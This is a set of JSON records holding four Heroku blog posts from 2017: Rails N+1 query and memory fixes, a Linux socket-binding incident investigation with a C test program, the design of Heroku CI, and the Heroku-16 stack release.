{"website": "Heroku", "title": "N+1 Queries or Memory Problems: Why not Solve Both?", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/solving-n-plus-one-queries", "abstract": "N+1 Queries or Memory Problems: Why not Solve Both? Posted by Richard Schneeman March 28, 2017 Listen to this article This post is going to help save you money if you're running a Rails server. It starts like this: you write an app. Let's say you're building the next hyper-targeted blogging platform for medium length posts. When you login, you see a paginated list of all of the articles you've written. You have a Post model and maybe for to do tags, you have a Tag model, and for comments, you have a Comment model. You write your view so that it renders the posts: <% @posts.each do |post| %>\n  <%= link_to(post, post.title) %>\n  <%= teaser_for(post) %>\n  <%= \"#{post.comments.count} comments\"\n<% end %>\n\n<%= pagination(@posts) %> See any problems with this?  We have to make a single query to return all the posts - that's where the @posts comes from.  Say that there are N posts returned.  In the code above, as the view iterates over each post, it has to calculate post.comments.count - but that in turn needs another database query.  This is the N+1 query problem - our initial single query (the 1 in N+1) returns something (of size N) that we iterate over and perform yet another database query on (N of them). Introducing Includes If you've been around the Rails track long enough you've probably run into the above scenario before. If you run a Google search, the answer is very simple -- \"use includes\". The code looks like this: # before\n@posts = current_user.posts.per_page(20).page(params[:page]) and after @posts = current_user.posts.per_page(20).page(params[:page])\n@posts = @posts.includes(:comments) This is still textbook, but let's look at what's going on. Active Record uses lazy querying so this won't actually get executed until we call @posts.first or @posts.all or @posts.each . When we do that two queries get executed, the first one for posts makes sense: select * from posts where user_id=? limit ? offset ? Active Record will pass in user_id and limit and offset into the bind params and you'll get your array of posts. Note: we almost always want all queries to be scoped with a limit in production apps. The next query you'll see may look something like this: select * from comments where post_id in ? Notice anything wrong? Bonus points if you found it, and yes, it has something to do with memory. If each of those 20 blog posts has 100 comments, then this query will return 2,000 rows from your database. Active Record doesn't know what data you need from each post comment, it'll just know it was told you'll eventually need them. So what does it do? It creates 2,000 Active Record objects in memory because that's what you told it to do. That's the problem, you don't need 2,000 objects in memory. You don't even need the objects, you only need the count. The good: You got rid of your N+1 problem. The bad: You're stuffing 2,000 (or more) objects from the database into memory when you aren't going to use them at all. This will slow down this action and balloon the memory use requirements of your app. It's even worse if the data in the comments is large. For instance, maybe there is no max size for a comment field and people write thousand word essays, meaning we'll have to load those really large strings into memory and keep them there until the end of the request even though we're not using them. N+1 Is Bad, Unneeded Memory Allocation Is Worse Now we've got a problem. We could \"fix\" it by re-introducing our N+1 bug. That's a valid fix, however, you can easily benchmark it. Use rack-mini-profiler in development on a page with a large amount of simulated data. Sometimes it's faster to not \"fix\" your N+1 bugs. That's not good enough for us, though -- we want no massive memory allocation spikes and no N+1 queries. Counter Cache What's the point of having Cache if you can't count it? Instead of having to call post.comments.count each time, which costs us a SQL query, we can store that data directly inside of the Post model. This way when we load a Post object we automatically have this info. From the docs for the counter cache you'll see we need to change our model to something like this: class Comment < ApplicationRecord\n   belongs_to :post , counter_cache: count_of_comments\n  #…\nend Now in our view, we can call: <%= \"#{post.count_of_comments} comments\"  %> Boom! Now we have no N+1 query and no memory problems. But... Counter Cache Edge Cases You cannot use a counter cache with a condition. Let's change our example for a minute. Let's say each comment could either be \"approved\", meaning you moderated it and allow it to show on your page, or \"pending\". Perhaps this is a vital piece of information and you MUST show it on your page.  Previously we would have done this: <%= \"#{ post.comments.approved.count } approved comments\"  %>\n  <%= \"#{ post.comments.pending.count } pending comments\"  %> In this case the Comment model has a status field and calling comments.pending is equivalent to adding where(status: \"pending\") . It would be great if we could have a post.count_of_pending_comments cache and a post.count_of_approved_comments cache, but we can't. There are some ways to hack it, but there are edge cases, and not all apps can safely accommodate for all edge cases. Let's say ours is one of those. Now what? We could get around this with some view caching because if we cache your entire page, we only have to render it and pay that N+1 cost once. Maybe fewer times if we are re-using view components and are using \"Russian doll\" style view caches . If view caching is out of the question due to <reasons>, what are we left with? We have to use our database the way the original settlers of the Wild West did, manually and with great effort. Manually Building Count Data in Hashes In our controller where we previously had this: @posts = current_user.posts.per_page(20).page(params[:page])\n@posts = @posts.includes(:comments) We can remove that includes and instead build two hashes. Active Record returns hashes when we use group() . In this case we know we want to associate comment count with each post, so we group by :post_id . @posts = current_user.posts.per_page(20).page(params[:page])\npost_ids = @posts.map(&:id)\n@pending_count_hash   = Comment.pending.where(post_id: post_ids).group(:post_id).count\n@approved_count_hash = Comment.approved.where(post_id: post_ids).group(:post_id).count Now we can stash and use this value in our view instead: <%= \"#{ @approved_count_hash[post.id] || 0  } approved comments\"  %>\n  <%= \"#{ @pending_count_hash[post.id] || 0 } pending comments\"  %> Now we have 3 queries, one to find our posts and one for each comment type we care about. This generates 2 extra hashes that hold the minimum of information that we need. I've found this strategy to be super effective in mitigating memory issues while not sacrificing on the N+1 front. But what if you're using that data inside of methods. Fat Models, Low Memory Rails encourage you to stick logic inside of models. If you're doing that, then perhaps this code wasn't a raw SQL query inside of the view but was instead nested in a method. def approved_comment_count\n  self.comments.approved.count\nend Or maybe you need to do the math, maybe there is a critical threshold where pending comments overtake approved: def comments_critical_threshold?\n  self.comments.pending.count < self.comments.approved.count\nend This is trivial, but you could imagine a more complex case where logic is happening based on business rules. In this case, you don't want to have to duplicate the logic in your view (where we are using a hash) and in your model (where we are querying the database). Instead, you can use dependency injection. Which is the hyper-nerd way of saying we'll pass in values. We can change the method signature to something like this: def comments_critical_threshold?(pending_count: comments.pending.count, approved_count: comments.approved.count)\n  pending_count < approved_count\nend Now I can call it and pass in values: post.comments_critical_threshold?(pending_count: @pending_count_hash[post.id] || 0 , approved_count: @approved_count_hash[post.id] || 0 ) Or, if you're using it somewhere else, you can use it without passing in values since we specified our default values for the keyword arguments. BTW, aren't keyword arguments great? post.comments_critical_threshold? # default values are used here There are other ways to write the same code: def comments_critical_threshold?(pending_count , approved_count )\n  pending_count ||= comments.pending.count\n  approved_count ||= comments.approved.count\n  pending_count < approved_count\nend You get the gist though -- pass values into your methods if you need to. More than Count What if you're doing more than just counting? Well, you can pull that data and group it in the same way by using select and specifying multiple fields. To keep going with our same example, maybe we want to show a truncated list of all commenter names and their avatar URLs: @comment_names_hash = Comment.where(post_id: post_ids).select(\"names, avatar_url\").group_by(&:post_ids) The results look like this: 1337: [\n  { name: \"schneems\", avatar_url: \"https://http.cat/404.jpg\" },\n  { name: \"illegitimate45\", avatar_url: \"https://http.cat/451.jpg\" }\n] The 1337 is the post id, and then we get an entry with a name and an avatar_url for each comment. Be careful here, though, as we're returning more data-- you still might not need all of it and making 2,000 hashes isn't much better than making 2,000 unused Active Record objects. You may want to better constrain your query with limits or by querying for more specific information. Are We There Yet At this point, we have gotten rid of our N+1 queries and we're hardly using any memory compared to before. Yay! Self-five. :partyparrot:. 🎉 Here's where I give rapid-fire suggestions. Use the bullet gem -- it will help identify N+1 query locations and unused includes -- it's good. Use rack-mini-profiler in development. This will help you compare relative speeds of your performance work. I usually do all my perf work on a branch and then I can easily go back and forth between that and master to compare speeds. Use production-like data in development. This performance \"bug\" won't show until we've got plenty of posts or plenty of comments. If your prod data isn't sensitive you can clone it using something like $ heroku pg:pull to test against, but make sure you're not sending out emails or spending real money or anything first. You can see memory allocations by using rack-mini-profiler with memory-profiler and adding pp=profile-memory to the end of your URL. This will show you things like total bytes allocated, which you can use for comparison purposes. Narrow down your search by focusing on slow endpoints. All performance trackers list out slow endpoints, this is a good place to start. Scout will show you memory breakdown per request and makes finding these types of bugs much easier to hunt down. They also have an add-on for Heroku. You can get started for free $ heroku addons:create scout:chair If you want to dig deeper into what's going on with Ruby's use of memory check out the Memory Quota Exceeded in Ruby (MRI) Dev Center article , my How Ruby Uses Memory , and also Nate Berkopec's Halve your memory use with these 12 Weird Tricks .", "date": "2017-03-28,"},
{"website": "Heroku", "title": "Sockets in a Bind", "author": ["Lex Neva"], "link": "https://blog.heroku.com/sockets-in-a-bind", "abstract": "Sockets in a Bind Posted by Lex Neva March 30, 2017 Listen to this article Back on August 11, 2016, Heroku experienced increased routing latency in the EU region of the common runtime. While the official follow-up report describes what happened and what we've done to avoid this in the future, we found the root cause to be puzzling enough to require a deep dive into Linux networking. The following is a write-up by SRE member Lex Neva ( what's SRE? ) and routing engineer Fred Hebert (now Heroku alumni) of an interesting Linux networking \"gotcha\" they discovered while working on incident 930. The Incident Our monitoring systems paged us about a rise in latency levels across the board in the EU region of the Common Runtime. We quickly saw that the usual causes didn’t apply: CPU usage was normal, packet rates were entirely fine, memory usage was green as a summer field, request rates were low, and socket usage was well within the acceptable range. In fact, when we compared the EU nodes to their US counterparts, all metrics were at a nicer level than the US ones, except for latency. How to explain this? One of our engineers noticed that connections from the routing layer to dynos were getting the POSIX error code EADDRINUSE , which is odd. For a server socket created with listen() , EADDRINUSE indicates that the port specified is already in use. But we weren’t talking about a server socket; this was the routing layer acting as a client, connecting to dynos to forward an HTTP request to them.  Why would we be seeing EADDRINUSE ? TCP/IP Connections Before we get to the answer, we need a little bit of review about how TCP works. Let’s say we have a program that wants to connect to some remote host and port over TCP.  It will tell the kernel to open the connection, and the kernel will choose a source port to connect from.  That’s because every IP connection is uniquely specified by a set of 4 pieces of data: ( <SOURCE-IP> : <SOURCE-PORT> , <DESTINATION-IP> : <DESTINATION-PORT> ) No two connections can share this same set of 4 items (called the “4-tuple”).  This means that any given host ( <SOURCE-IP> ) can only connect to any given destination ( <DESTINATION-IP> : <DESTINATION-PORT> ) at most 65536 times concurrently, which is the total number of possible values for <SOURCE-PORT> .  Importantly, it’s okay for two connections to use the same source port, provided that they are connecting to a different destination IP and/or port. Usually a program will ask Linux (or any other OS) to automatically choose an available source port to satisfy the rules.  If no port is available (because 65536 connections to the given destination ( <DESTINATION-IP> : <DESTINATION-PORT> ) are already open), then the OS will respond with EADDRINUSE . This is a little complicated by a feature of TCP called “TIME_WAIT”.  When a given connection is closed, the TCP specification declares that both ends should wait a certain amount of time before opening a new connection with the same 4-tuple.  This is to avoid the possibility that delayed packets from the first connection might be misconstrued as belonging to the second connection. Generally this TIME_WAIT waiting period lasts for only a minute or two.  In practice, this means that even if 65536 connections are not currently open to a given destination IP and port, if enough recent connections were open, there still may not be a source port available for use in a new connection. In practice even fewer concurrent connections may be possible since Linux tries to select source ports randomly until it finds an available one, and with enough source ports used up, it may not find a free one before it gives up. Port exhaustion in Heroku’s routing layer So why would we see EADDRINUSE in connections from the routing layer to dynos?  According to our understanding, such an error should not happen.  It would indicate that 65536 connections from a specific routing node were being made to a specific dyno.  This should mean that the theoretical limit on concurrent connections should be far more than a single dyno could ever hope to handle. We could easily see from our application traffic graphs that no dyno was coming close to this theoretical limit.  So we were left with a concerning mystery: how was it possible that we were seeing EADDRINUSE errors? We wanted to prevent the incident from ever happening again, and so we continued to dig - taking a dive into the internals of our systems. Our routing layer is written in Erlang, and the most likely candidate was its virtual machine’s TCP calls. Digging through the VM’s network layer we got down to the sock_connect call which is mostly a portable wrapper around the linux connect() syscall. Seeing this, it seemed that nothing in there was out of place to cause the issue. We’d have to go deeper, in the OS itself. After digging and reading many documents, one of us noticed this bit in the now well-known blog post Bind before connect : Bind is usually called for listening sockets so the kernel needs to make sure that the source address is not shared with anyone else. It's a problem. When using this techique [sic] in this form it's impossible to establish more than 64k (ephemeral port range) outgoing connections in total. After that the attempt to call bind() will fail with an EADDRINUSE error - all the source ports will be busy. [...] When we call bind() the kernel knows only the source address we're asking for. We'll inform the kernel of a destination address only when we call connect() later. This passage seems to be describing a special case where a client wants to make an outgoing connection with a specific source IP address.  We weren’t doing that in our Erlang code, so this still didn’t seem to fit our situation well.  But the symptoms matched so well that we decided to check for sure whether the Erlang VM was doing a bind() call without our knowledge. We used strace to determine the actual system call sequence being performed.  Here’s a snippet of strace output for a connection to 10.11.12.13:80 : socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3\n*bind*(3, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(\"0.0.0.0\")}, 16) = 0\nconnect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(\"10.11.12.13\")}, 16) = 0 To our surprise, bind() was being called!  The socket was being bound to a <SOURCE-IP> : <SOURCE-PORT> of 0.0.0.0:0 .  Why? This instructs the kernel to bind the socket to any IP and any port.  This seemed a bit useless to us, as the kernel would already select an appropriate <SOURCE-IP> when connect() was called, based on the destination IP address and the routing table. This bind() call seemed like a no-op.  But critically, this call required the kernel to select the <SOURCE-IP> right then and there , without having any knowledge of the other 3 parts of the 4-tuple: <SOURCE-IP> , <DESTINATION-IP> , and <DESTINATION-PORT> .  The kernel would therefore have only 65536 possible choices and might return EADDRINUSE , as per the bind() manpage: EADDRINUSE (Internet  domain  sockets) The port number was specified as zero in the socket address structure, but, upon attempting to bind to an ephemeral port, it was determined that all port numbers in the ephemeral port range are currently in use.  See the discussion of /proc/sys/net/ipv4/ip_local_port_range ip(7). Unbeknownst to us, we had been operating for a very long time with far lower of a tolerance threshold than expected -- the ephemeral port range was effectively a limit to how much traffic we could tolerate per routing layer instance, while we thought no such limitation existed. The Fix Reading further in Bind before connect yields the fix: just set the SO_REUSEADDR socket option before the bind() call.  In Erlang this is done by simply passing {reuseaddr, true} . At this point we thought we had our answer, but we had to be sure.  We decided to test it. We first wrote a small C program that exercised the current limit: #include <sys/types.h>\n#include <sys/socket.h>\n#include <stdio.h>\n#include <string.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nint main(int argc, char **argv) {\n  /* usage: ./connect_with_bind <num> <dest1> <dest2> ... <destN>\n   *\n   * Opens <num> connections to port 80, round-robining between the specified\n   * destination IPs.  Then it opens the same number of connections to port\n   * 443.\n   */\n\n  int i;\n  int fds[131072];\n  struct sockaddr_in sin;\n  struct sockaddr_in dest;\n\n  memset(&sin, 0, sizeof(struct sockaddr_in));\n\n  sin.sin_family = AF_INET;\n  sin.sin_port = htons(0);  // source port 0 (kernel picks one)\n  sin.sin_addr.s_addr = htonl(INADDR_ANY);  // source IP 0.0.0.0\n\n  for (i = 0; i < atoi(argv[1]); i++) {\n    memset(&dest, 0, sizeof(struct sockaddr_in));\n    dest.sin_family = AF_INET;\n    dest.sin_port = htons(80);\n\n    // round-robin between the destination IPs specified\n    dest.sin_addr.s_addr = inet_addr(argv[2 + i % (argc - 2)]);\n\n    fds[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    bind(fds[i], (struct sockaddr *)&sin, sizeof(struct sockaddr_in));\n    connect(fds[i], (struct sockaddr *)&dest, sizeof(struct sockaddr_in));\n  }\n\n  sleep(5);\n\n  fprintf(stderr, \"GOING TO START CONNECTING TO PORT 443\\n\");\n\n  for (i = 0; i < atoi(argv[1]); i++) {\n    memset(&dest, 0, sizeof(struct sockaddr_in));\n    dest.sin_family = AF_INET;\n    dest.sin_port = htons(443);\n    dest.sin_addr.s_addr = inet_addr(argv[2 + i % (argc - 2)]);\n\n    fds[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    bind(fds[i], (struct sockaddr *)&sin, sizeof(struct sockaddr_in));\n    connect(fds[i], (struct sockaddr *)&dest, sizeof(struct sockaddr_in));\n  }\n\n  sleep(5);\n} We increased our file descriptor limit and ran this program as follows: ./connect_with_bind 65536 10.11.12.13 10.11.12.14 10.11.12.15 This program attempted to open 65536 connections to port 80 on the three IPs specified.  Then it attempted to open another 65536 connections to port 443 on the same IPs.  If only the 4-tuple were in play, we should be able to open all of these connections without any problem. We ran the program under strace while monitoring ss -s for connection counts.  As expected, we began seeing EADDRINUSE errors from bind() .  In fact, we saw these errors even before we’d opened 65536 connections.  The Linux kernel does source port allocation by randomly selecting a candidate port and then checking the N following ports until it finds an available port.  This is an optimization to prevent it from having to scan all 65536 possible ports for each connection. Once that baseline was established, we added the SO_REUSEADDR socket option.  Here are the changes we made: --- connect_with_bind.c 2016-12-22 10:29:45.916723406 -0500\n+++ connect_with_bind_and_reuse.c   2016-12-22 10:31:54.452322757 -0500\n@@ -17,6 +17,7 @@\n   int fds[131072];\n   struct sockaddr_in sin;\n   struct sockaddr_in dest;\n+  int one = 1;\n\n   memset(&sin, 0, sizeof(struct sockaddr_in));\n\n@@ -33,6 +34,7 @@\n     dest.sin_addr.s_addr = inet_addr(argv[2 + i % (argc - 2)]);\n\n     fds[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n+    setsockopt(fds[i], SOL_SOCKET, SO_REUSEADDR, &one, sizeof(int));\n     bind(fds[i], (struct sockaddr *)&sin, sizeof(struct sockaddr_in));\n     connect(fds[i], (struct sockaddr *)&dest, sizeof(struct sockaddr_in));\n   }\n@@ -48,6 +50,7 @@\n     dest.sin_addr.s_addr = inet_addr(argv[2 + i % (argc - 2)]);\n\n     fds[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n+    setsockopt(fds[i], SOL_SOCKET, SO_REUSEADDR, &one, sizeof(int));\n     bind(fds[i], (struct sockaddr *)&sin, sizeof(struct sockaddr_in));\n     connect(fds[i], (struct sockaddr *)&dest, sizeof(struct sockaddr_in));\n   } We ran it like this: ./connect_with_bind_and_reuse 65536 10.11.12.13 10.11.12.14 10.11.12.15 Our expectation was that bind() would stop returning EADDRINUSE .  The new program confirmed this fairly rapidly, and showed us once more that what you may expect from theory and practice has quite a gap to be bridged. Knowing this, all we had to do is confirm that the {reuseaddr, true} option for the Erlang side would work, and a quick strace of a node performing the call confirmed that the appropriate setsockopt() call was being made. Giving Back It was quite an eye-opening experience to discover this unexpected connection limitation in our routing layer. The patch to Vegur , our open-sourced HTTP proxy library, was deployed a couple of days later, preventing this issue from ever biting us again. We hope that sharing our experience here, we might save you from similar bugs in your systems.", "date": "2017-03-30,"},
{"website": "Heroku", "title": "On Building Tools for Developers: Heroku CI", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/building-tools-for-developers-heroku-ci", "abstract": "On Building Tools for Developers: Heroku CI Posted by Ike DeLorenzo April 18, 2017 Listen to this article How we built Heroku CI: our product intuition checked against what the market wants (we surveyed ~1000 developers to figure out the latter, and the results were surprising) Two approaches to building any product are often in tension: designing from inspiration, and designing from information. On the pure inspiration side, you just build the product you dream of, and trust that it will be so awesome and useful, that it will succeed in the market. On the pure information side, you build exactly what the market is asking for, as best you can tell (think: surveys, top customer feature requests, consultants, customer panels). Our initial design for Heroku CI ( currently in public beta ) was nearly pure inspiration, in large part from our engineering staff. We had a good idea of our dream CI product, and many of the raw materials to build it (Heroku apps, our build process, Heroku add-ons, etc.). And Heroku, like the rest of Salesforce, strongly encourages such experimentation and innovation when individual product teams are so inspired. We create and improve a lot of amazing products that way. Heroku CI: Design by Inspiration The Heroku DevEx (Developer Experience) team is distributed across two continents and four countries. We need well-structured, team-oriented developer workflow as much as our users and customers, including, of course, running tests for continuous integration ( CI ). And we are a pretty experienced team of developers, product, and design. We spend a lot of time with customers, and, of course, live and breathe in today's app dev and DevOps world. So the Heroku CI design began with our own well-formed and granular ideas on what our customers wanted out of CI, and we quickly arrived at what turned out to be a pretty stable initial design. Our alpha launch had Heroku CI integrating with, and extending, Heroku's continuous delivery (CD) feature set: Heroku Pipelines, Review Apps, and Heroku GitHub deploys. The initial feature set and developer experience were inspired largely from our own intuitions, experiences, and conceptions of customer need. Heroku CI: CI Design by Information Once we had a limited-functionality alpha version (MVP of our pre-conceived design for Heroku CI), we tested it over several weeks internally, then invited Heroku users via Twitter and direct e-mail to try it out. For users to access this \"limited public beta\" CI feature, they had to complete a survey on how they use CI and what they want from CI. We wanted to determine how they use (and hope to use) CI, and also wanted to make sure those interested could actually use the new Heroku CI alpha -- e.g. that we supported the language they required. As it turned out, so many users responded -- about 1000 for most questions -- that our short survey has become the largest of cloud PaaS developers on CI in recent years. The data helped us shape the planned CI feature set for public release. We also think the survey results will help the dev tools community understand how developers want to use CI, and so we are making the full results available in this post. The survey covers customers' responses on how they want to use CI, and how it fits into their CD and team workflows. You can read elsewhere about using Heroku CI . And you can just try it out yourself: the feature is in public beta and available by default to all Heroku users (just check the Heroku Pipelines web interface). Right now let's talk about how we decided what to build. Some customer concerns initially seemed obvious, but we asked anyway: of course we found that CI users want shorter queue times, faster test runs. Some features were not as predictable. And some of what's been most successful in our private beta was not requested by surveyed or otherwise vocal users at all. How Companies Build Successful Devops Products Almost a year ago, at the Heroku DevEx team offsite, we met up one morning at a London coffee house, the café at the Hoxton, Shoreditch. An informal conversation on what features/products to build next turned to CI. There had been customer requests to be sure. And it seemed to us like CI would be a great addition to our Heroku Flow continuous delivery features. Most of all, we just wanted to build it. CI seemed to us so compelling for our users as an integrated feature, and so compelling to us as a very cool thing to build, that there was soon consensus on the team. I'll note here that even at a biggish company like Heroku our team excitement around building cool stuff that users will love has a lot of influence over what we build. We didn't do a ton of financial analysis, or call our big-firm Analyst. We, the Developer Experience Team, wanted to build CI; there was roughly adequate customer and strategic reasons to do it, and we had the collective excitement and motivation to give it a shot. Personally, it’s gratifying to me that software can be built that way at Heroku and Salesforce. The Hoxton café, by the way, is a fabulous place. You can stay there all day, and we did, occupying valuable retail space and working out what Heroku CI might look like: UX, features, integrations, and above all, how the feature will live up to the Heroku promise of being (all at one now) simple, prescriptive, and powerful. Thankfully they serve breakfast, lunch, and a very nice dinner. On the Rise of DevOps CI as a practice in software development has been growing relentlessly over the past decade (even as interest in software development as a holistic discipline has stagnated). \"Software development\" is increasingly many separate disciplines, each with its own constituency and community -- the DevOps segment alone is projected to be a nearly $3 billion market in 2017.  And developer focus on DevOps has given rise to many great products in the CI market. We wanted to understand how we could help developers have even better CI experiences, get better productivity, and build better products of their own. Our spike on the idea of a \"Heroku CI\" was essentially a simple test runner (for Ruby and Node) with a nice-looking UI integrated into the Heroku Pipelines interface. This spike, plus a nice UI and some basic supporting features, constituted our the version we released to alpha.  Being Heroku we had a lot of the parts we needed to assemble test environments (ephemeral apps, dynos, add-ons, a build system, …) just lying around, and lots of co-workers willing to try out what we built. Quite quickly, we had an initial CI test-runner bolted onto the existing Pipelines feature. We found it useful to us internally and we felt comfortable inviting a few dozen friends-of-Heroku to use it and give feedback. Within a few more weeks, and a few dozen iterations, we were ready to ask a broader audience to weigh in (and take the survey). On the Rise of Pre-integrated Devtools Offerings? Yes, CI is integrated with Heroku Pipelines , and in fact they share a UX. While we could separate these in the future, the integrated offering is proving popular with users from big enterprise to small teams. We think this is in large part because it’s integrated. There was a time when \"best of breed\" was the catchphrase in DevOps. You spun together VMware, Chef, Puppet, Jenkins, Git, etc. So why are integrated offerings popular now? Our thinking is that CI/CD go together like chocolate and peanut butter: it’s a bit messy to put together yourself, but great when someone packages it for you. We noticed that our users, in general, enjoyed using CI products that set-up and integrated easily with Heroku Pipelines (great products like Travis and Circle). The popularity of fully integrated CI offerings wasn't lost on us either (look at the popularity of GitLab's integrated CI, or Atlassian's increasingly integrated devtools products). Among other advantages, you get single auth, add-ons work automatically, and there's no context switching from product to product in use or administration. The Consumerization of DevOps As importantly, we've noticed developers are demanding better UX for dev tools in general, and CI in particular (think of the delightful interface of Snap CI and others). We also noticed the pain many users described in setting up Jenkins, which leads the CI industry, but comes with a dizzying array of complex options, plug-ins (1500+), and a typically long set-up time, and maintenance labor. An extreme but real example here: one large Heroku customer needs to open a ticket with its IT department to provision each new Jenkins instance, often adding two months to the start-up of a new project if they want to use CI. This company is now using integrated Heroku CI on some projects, reducing CI setup time from months to minutes. The Customer Survey Results (and How We Applied Them) Preferred Developer Stack for Heroku Developers Developers, statistically, are centering around a few preferred workflow stacks.  GitHub and Slack are the dominant VCS and team chat[ops] tools by most current market measures -- strong integration with these seemed necessary for us, and for any DevOps product. Atlassian's Bitbucket, HipChat are each a solid second in these roles. Together with Trello this would seem to give Atlassian a significant enough center of gravity (especially at larger companies) to also require good integration. And GitLab is surging in VCS and CI (and in developer buzz), at a curve that seems poised to challenge much longer-standing products. Being part of these popular toolchains is important to us, and where there is overlap in features, developers can choose where they want to live on the way to deployment and delivery. Note that, as Heroku is a cloud platform, our user base tends to prefer cloud products. We know also that a significant proportion of our customers who use \"on premise\" version control options like GitHub Enterprise and Bitbucket Server are hosting them in the cloud, often on AWS. So even a portion of these on-prem components are running as a self-managed cloud-like service. Simple Integrated Solutions Over Best-of-breed Complexity Jenkins is the leader in CI market share (around 70% by most analyst estimates). And its usage is growing at a pretty good clip . The vast majority of Jenkins installations are on-premise (about 83%)  Our customers are always in the cloud,  deploying to either Heroku's Common Runtime -- our traditional secure public cloud Heroku -- or to Heroku Private Spaces, our virtual private PaaS cloud offering. So for the cloud customers, as in our survey, the CI product usage sizes out a bit differently: I noted earlier the popularity of GitLab's integrated CI being significant to us in our decision to integrate CI. GitLab's been really good at moving fast in bringing popular, highly integrated features to market, building on its popular VCS. Note here that GitLab CI it is clearly the biggest mover in activity on Stack Overflow among popular cloud CI solutions. But all these cloud CI solutions are still dwarfed by Jenkins (as noted above, only 17% of Jenkins installs are in the cloud). Interestingly, Jenkins’ lovely new \" Blue Ocean \" UX, courtesy of CloudBees, seems to underscore the growing importance of simple, prescriptive developer experience in modern CI/CD solutions -- something that has always been, and is still, job 1 at Heroku. Speed Matters - A lot You'll notice in the first chart this post that fast queue time and fast execution time are the top most important features for surveyed users other than price. We have eliminated queue time altogether with Heroku CI. A new ephemeral CI environment (oh: it’s a Heroku app) is created at the beginning of each test run, and then destroyed when tests are complete. While there is some nominal setup time here, it’s nothing like traditional queue time waiting for a free CI worker. Environment Parity: Close Enough Is Good Enough for Most Note that at the chart at the top of the post, only about 40% of respondents found production environment parity to be \"important\". When we initially conceived of Heroku CI, we thought one of the biggest selling points would be environment parity between test runs environments (apps) and staging and production apps (environments). To our surprise, users did not care as much as we thought they should. This fact led us to an innovation around add-ons for ephemeral environments like CI and review apps. We now inform add-on partners that their add-on is being provisioned for an ephemeral Heroku app (a CI app in this case). During provisioning, the add-on vendors can choose to eliminate slow/costly features of the add-on that might take a long time to spin up, but are usually unnecessary for apps that will exist for such a short time – like long-term logging, billing features, etc. In this way, we are working across the ecosystem of cloud-based services that developers use to make sure each component is automatically configured for CI. We did make sure that you can customize CI apps in the environments section of the newly revised Heroku app.json manifest. Customizability, when we can do it in a way that doesn't complicate, is as important as being prescriptive. And Some Most Requested Features We Under-predicted Re-running tests was not part of initial CI alpha, and we were somewhat surprised by the high number of people who requested it both in the initial survey and among alpha users. So there’s now a big \"Run Again\" button on the UI, and we do find this feature frequently used in the current public beta. Browser testing – often called user acceptance testing or UAT – was popular with surveyed users, so it was moved up in our list of features planned for launch. UAT in a browser is also required by many Salesforce developers, whose applications are often web-deployed and/or exist within the Salesforce interface. (note that Heroku CI will also be used by Salesforce developers using Apex, hybrid-language apps, or frameworks like Lightning.) The Takeaway Product design by inspiration is exhilarating, and it's great to see a product or feature that arises from the sheer excitement of the team to build it succeeding with users. Verifying that our intuition was right with users takes a lot of time, but it's well worth it. In short what worked for us was to trust our instincts, but verify with users (and adjust). Most importantly, we view the developer community as a diverse ecosystem of innovators, thought leaders, vendors, and open source efforts, among others. It's a pleasure to share what we know, learn, and create with our vibrant, diverse community. Let us know what you think of Heroku CI, and what you want in your CI solutions, at heroku-ci-feedback@heroku.com continuous integration devops Heroku Flow", "date": "2017-04-18,"},
{"website": "Heroku", "title": "The Heroku-16 Stack is Now Generally Available", "author": ["Jon Byrum"], "link": "https://blog.heroku.com/heroku-16-is-generally-available", "abstract": "The Heroku-16 Stack is Now Generally Available Posted by Jon Byrum April 20, 2017 Listen to this article Your Heroku applications run on top of a curated stack, containing the operating system and other components needed at runtime.  We maintain the stack - updating the OS, the libraries, and ensuring that known security issues are resolved, so that you can focus on writing code. Today we're announcing the general availability of Heroku-16, our curated stack based on Ubuntu 16.04 LTS.  In addition to a new base operating system, Heroku-16 is updated with the latest libraries.  If you’re a Ruby or Python developer, Heroku-16 includes 15% more development headers at build time, making it easier to compile native packages on Heroku.  Finally, Heroku-16 offers a better local development experience when using Docker, because of its smaller image size. Since its beta in March, Heroku-16 has been tested on thousands of applications and is now ready for production on both Common Runtime and Private Spaces apps.  Heroku-16 will become the stack new applications use (i.e., the default stack) on May 8th, 2017.  To learn more about testing and upgrading your app, check out the Heroku-16 documentation . What's New Smaller Docker Image With the release of Heroku-16, we’ve changed the architecture of the stack, allowing us to provide you with a curated Ubuntu 16-based Docker image at 465 MB (vs 1.35 GB for Cedar-14). To use Heroku-16, specify it as your base image in your Dockerfile: FROM heroku/heroku:16 By using the Heroku-16 Docker image for local development , you ensure the stack running locally is the same stack running on Heroku (i.e., dev/prod parity).  Everyone -- Heroku customer or not -- is free to use the Heroku-16 Docker image. Improved Support for Compiling Native Ruby and Python Packages At build time Heroku-16 includes 15% more development headers than Cedar-14.  This means fewer failed builds when your app needs to compile native Ruby or Python packages. Updated Stack Libraries Heroku-16 should largely be backwards compatible with Cedar-14.  We have, however, removed lesser used packages to reduce the security surface area and stack image size.  Apps may also encounter incompatibilities because libraries on Heroku-16 have been updated to their most recent versions. Learn more about the packages installed in Cedar-14 and Heroku-16 . How to Test and Upgrade Testing Heroku-16 with your application, especially if you use review apps , is easy.  Simply define your stack in app.json and create a new pull request: {\n   \"stack\": \"heroku-16\"\n} If your tests are successful, you can upgrade your application: $ heroku stack:set heroku-16 -a example-app\n…\n$ git commit -m \"upgrade to heroku-16\" --allow-empty\n…\n$ git push heroku master For more information on upgrading your app, check out the Heroku-16 documentation . Stack Support Heroku-16 is now generally available and we recommend you use it for new apps.  Heroku-16 will be supported through April 2021, when Long Term Support (LTS) of Ubuntu 16.04 ends. Cedar-14 , the previous version of our stack, will continue to be supported through April 2019.  For more information, check out our stack update policy . stack", "date": "2017-04-20,"},
